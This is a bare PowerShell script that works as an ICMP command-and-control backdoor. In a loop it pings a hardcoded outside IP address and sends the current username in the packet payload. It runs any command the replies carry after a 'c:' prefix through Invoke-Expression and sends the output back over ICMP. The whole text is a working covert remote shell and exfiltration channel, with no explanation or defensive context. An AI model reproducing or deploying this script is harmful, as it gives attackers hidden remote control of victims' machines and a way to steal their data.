$sleep = 10; $target = "104.248.16.121"
while ($true) {
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("h:$env:USERNAME")) 
    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
    Write-Output $r
    if ($r -match "^c:(..*)$") {
        $out = Invoke-Expression $matches[1] 2>&1|out-string
        $ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("h:$env:USERNAME r:$out"))  
    }
    start-sleep $sleep
}